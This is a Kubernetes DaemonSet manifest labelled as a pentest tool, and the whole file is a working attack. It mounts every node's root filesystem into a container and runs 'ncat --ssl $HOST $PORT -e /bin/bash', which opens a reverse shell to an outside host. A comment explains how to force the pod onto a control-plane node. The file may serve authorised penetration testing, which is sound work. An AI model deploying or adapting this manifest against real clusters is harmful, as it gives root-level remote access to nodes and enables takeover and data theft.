apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: hostpath-revshell-daemonset
  labels:
    app: pentest
    type: daemonset
spec:
  selector:
    matchLabels:
      app: pentest
      type: daemonset
  template:
    metadata:
      labels:
        app: pentest
        type: daemonset
    spec:
      containers:
      - name: hostpath-revshell-daemonset
        image: raesene/ncat
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "ncat --ssl $HOST $PORT -e /bin/bash;" ]
      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
      volumes:
      - name: noderoot
        hostPath:
          path: /
      